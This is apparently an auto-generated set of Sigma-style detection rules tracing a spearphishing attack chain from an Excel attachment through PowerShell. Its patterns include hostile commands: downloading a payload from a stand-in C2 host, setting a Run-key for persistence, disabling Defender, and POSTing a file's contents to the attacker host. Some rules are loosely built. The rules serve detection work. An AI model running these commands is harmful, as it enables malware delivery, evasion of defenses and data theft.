```yaml
- title: Identify Initial Access via Spearphishing Email
  id: 123e4567-e89b-12d3-a456-426614174000
  description: Detects the opening of Outlook, indicating potential initial access via spearphishing email.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
      relation: "Process Start"
  condition: selection
  tags:
    - T1566
    - Initial Access
  level: high
---
- title: Detect Opening of Malicious Attachment
  id: 123e4567-e89b-12d3-a456-426614174001
  description: Detects the execution of Excel when a malicious attachment is opened.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
      relation: "Process Start"
      dstNode:
        Name: "Invoice_2023.xlsx"
        Type: "File"
  condition: selection
  tags:
    - T1203
    - Initial Access
  level: high
---
- title: Monitor Execution of the PowerShell Command
  id: 123e4567-e89b-12d3-a456-426614174002
  description: Detects the execution of PowerShell initiated by an Excel macro.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      Cmdline: "-ExecutionPolicy Bypass -File C:\\Users\\User\\Downloads\\malicious_script.ps1"
      relation: "Process Start"
  condition: selection
  tags:
    - T1059
    - Execution
  level: high
---
- title: Capture Payload Download and Execution
  id: 123e4567-e89b-12d3-a456-426614174003
  description: Identifies the PowerShell command that downloads and executes a payload.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      Cmdline: "Invoke-WebRequest -Uri \"http://malicious-c2-server.com/payload.exe\" -OutFile \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\""
      relation: "Process Start"
      dstNode:
        Image: "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"
        Type: "Process"
  condition: selection
  tags:
    - T1203
    - Execution
  level: high
---
- title: Detect Registry Modification for Persistence
  id: 123e4567-e89b-12d3-a456-426614174004
  description: Monitors for registry changes made by the payload to establish persistence.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      Image: "powershell.exe"
      Cmdline: "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"MaliciousApp\" -Value \"C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\" -PropertyType String"
      relation: "Process Start"
      dstNode:
        Key: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        Type: "Registry"
  condition: selection
  tags:
    - T1547
    - Persistence
  level: high
---
- title: Monitor Evasion of Security Mechanisms
  id: 123e4567-e89b-12d3-a456-426614174005
  description: Detects attempts to disable Windows Defender or other security features.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      Image: "powershell.exe"
      Cmdline: "Set-MpPreference -DisableRealtimeMonitoring $true"
      relation: "Process Start"
  condition: selection
  tags:
    - T1562
    - Defense Evasion
  level: high
---
- title: Capture Data Exfiltration Attempts
  id: 123e4567-e89b-12d3-a456-426614174006
  description: Identifies network traffic related to data exfiltration to the attacker's server.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      Image: "powershell.exe"
      Cmdline: "Invoke-WebRequest -Uri \"http://malicious-c2-server.com/exfiltrate\" -Method POST -Body (Get-Content \"C:\\Users\\User\\Documents\\sensitive_data.txt\")"
      relation: "Process Start"
      dstNode:
        Dstaddress: "malicious-c2-server.com"
        Port: 80
        Type: "Network"
  condition: selection
  tags:
    - T1041
    - Exfiltration
  level: high
```